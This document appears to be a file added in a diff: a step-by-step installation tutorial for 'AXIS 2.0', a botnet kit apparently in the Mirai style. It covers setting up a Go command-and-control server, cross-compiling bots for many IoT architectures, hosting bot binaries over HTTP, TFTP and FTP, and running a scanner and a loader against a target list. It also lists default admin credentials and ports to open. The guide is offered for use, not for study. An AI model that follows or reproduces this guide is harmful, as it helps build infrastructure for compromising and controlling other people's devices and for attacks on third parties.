@@ -1,0 +1,241 @@
+================================================================================
+                    AXIS 2.0 INSTALLATION TUTORIAL
+                         Ubuntu Server 20.04/22.04
+================================================================================
+
+This tutorial will guide you through setting up AXIS 2.0 on Ubuntu Server.
+
+================================================================================
+STEP 1: SYSTEM UPDATE AND BASIC PACKAGES
+================================================================================
+
+sudo apt update && sudo apt upgrade -y
+sudo apt install -y screen wget curl git build-essential
+
+================================================================================
+STEP 2: INSTALL GO (Required for C&C Server)
+================================================================================
+
+# Download Go 1.19+
+cd /tmp
+wget https://go.dev/dl/go1.19.5.linux-amd64.tar.gz
+
+# Extract and install
+sudo tar -C /usr/local -xzf go1.19.5.linux-amd64.tar.gz
+
+# Add to PATH
+echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
+source ~/.bashrc
+
+# Verify installation
+go version
+
+================================================================================
+STEP 3: INSTALL MYSQL/MARIADB DATABASE
+================================================================================
+
+# Install MariaDB
+sudo apt install -y mariadb-server mariadb-client
+
+# Start and enable MariaDB
+sudo systemctl start mariadb
+sudo systemctl enable mariadb
+
+# Secure installation
+sudo mysql_secure_installation
+
+# Create database and user
+sudo mysql -u root -p << EOF
+CREATE DATABASE AXIS2;
+CREATE USER 'axis'@'localhost' IDENTIFIED BY 'axis_password_123';
+GRANT ALL PRIVILEGES ON AXIS2.* TO 'axis'@'localhost';
+FLUSH PRIVILEGES;
+EXIT;
+EOF
+
+================================================================================
+STEP 4: INSTALL CROSS-COMPILERS (For Multi-Architecture Bot Builds)
+================================================================================
+
+# Install common cross-compilers
+sudo apt install -y \
+    gcc-arm-linux-gnueabi \
+    gcc-arm-linux-gnueabihf \
+    gcc-aarch64-linux-gnu \
+    gcc-mips-linux-gnu \
+    gcc-mipsel-linux-gnu \
+    gcc-powerpc-linux-gnu \
+    gcc-sparc64-linux-gnu \
+    gcc-m68k-linux-gnu \
+    gcc-sh4-linux-gnu \
+    gcc-x86-64-linux-gnu
+
+================================================================================
+STEP 5: INSTALL WEB SERVERS (For Binary Hosting)
+================================================================================
+
+# Install Apache
+sudo apt install -y apache2
+
+# Configure directories
+sudo mkdir -p /var/www/html/bins
+sudo chmod 777 /var/www/html/bins
+
+# Install TFTP server
+sudo apt install -y tftpd-hpa
+sudo mkdir -p /var/lib/tftpboot
+sudo chmod 777 /var/lib/tftpboot
+
+# Install FTP server
+sudo apt install -y vsftpd
+sudo mkdir -p /var/ftp
+sudo chmod 777 /var/ftp
+
+# Restart services
+sudo systemctl restart apache2
+sudo systemctl restart tftpd-hpa
+sudo systemctl restart vsftpd
+
+================================================================================
+STEP 6: INSTALL DEPENDENCIES FOR C&C
+================================================================================
+
+# Install Go dependencies
+cd /root/production\ source/cnc
+go mod init production-cnc
+go get github.com/go-sql-driver/mysql
+go get github.com/mattn/go-shellwords
+
+================================================================================
+STEP 7: BUILD AXIS 2.0
+================================================================================
+
+cd /root/production\ source
+chmod +x build.sh
+
+# Run build script
+./build.sh
+
+# If build fails, install missing dependencies:
+sudo apt install -y libmysqlclient-dev
+
+================================================================================
+STEP 8: IMPORT DATABASE SCHEMA
+================================================================================
+
+sudo mysql -u root -p < database.sql
+
+# Change default password!
+sudo mysql -u root -p AXIS2 << EOF
+UPDATE users SET password='YOUR_NEW_PASSWORD' WHERE username='admin';
+EXIT;
+EOF
+
+================================================================================
+STEP 9: CONFIGURE AXIS 2.0
+================================================================================
+
+# Edit C&C configuration
+nano cnc/main.go
+# Change: DatabasePass, CNCListenAddr, APIListenAddr
+
+# Edit bot configuration
+nano bot/config.h
+# Change: CNC_ADDR, CNC_PORT
+
+# Edit loader configuration
+nano loader/config.h
+# Change: HTTP_SERVER, TFTP_SERVER
+
+# Edit downloader configuration
+nano dlr/dlr.h
+# Change: HTTP_SERVER
+
+================================================================================
+STEP 10: RUN AXIS 2.0
+================================================================================
+
+# Open multiple screen sessions
+screen -S cnc
+./cnc_server
+
+# Press Ctrl+A, then D to detach
+
+screen -S scan
+./scanListen
+
+# Press Ctrl+A, then D to detach
+
+screen -S loader
+./loader < list.txt
+
+# Press Ctrl+A, then D to detach
+
+# Reattach to screens:
+screen -r cnc
+screen -r scan
+screen -r loader
+
+================================================================================
+STEP 11: FIREWALL CONFIGURATION
+================================================================================
+
+# Open required ports
+sudo ufw allow 3778/tcp    # C&C Server
+sudo ufw allow 3779/tcp    # API Server
+sudo ufw allow 9555/tcp    # Scan Listener
+sudo ufw allow 80/tcp      # HTTP Server
+sudo ufw allow 69/udp      # TFTP Server
+sudo ufw allow 21/tcp      # FTP Server
+sudo ufw enable
+
+================================================================================
+STEP 12: VERIFY INSTALLATION
+================================================================================
+
+# Check services are running
+screen -ls
+
+# Check database connection
+mysql -u axis -p AXIS2 -e "SELECT * FROM users;"
+
+# Check web server
+curl http://localhost/bins/
+
+# Test C&C connection
+telnet localhost 3778
+
+================================================================================
+DEFAULT CREDENTIALS
+================================================================================
+
+Database:
+  Host: localhost
+  Database: AXIS2
+  User: axis
+  Password: axis_password_123
+
+Admin Panel:
+  Username: admin
+  Password: dhcp146E (CHANGE THIS!)
+  API Key: AXIS2-ADMIN-7F3D9A2B-E8C1-4F6A (CHANGE THIS!)
+
+================================================================================
+TROUBLESHOOTING
+================================================================================
+
+Problem: C&C won't start
+Solution: Check database credentials in cnc/main.go
+
+Problem: Bots won't connect
+Solution: Verify CNC_ADDR in bot/config.h matches your server IP
+
+Problem: Build fails
+Solution: Install missing cross-compilers or build without them
+
+Problem: Permission denied
+Solution: chmod 777 on bins directories
+
+================================================================================
+For more help, check the README.md file
+================================================================================
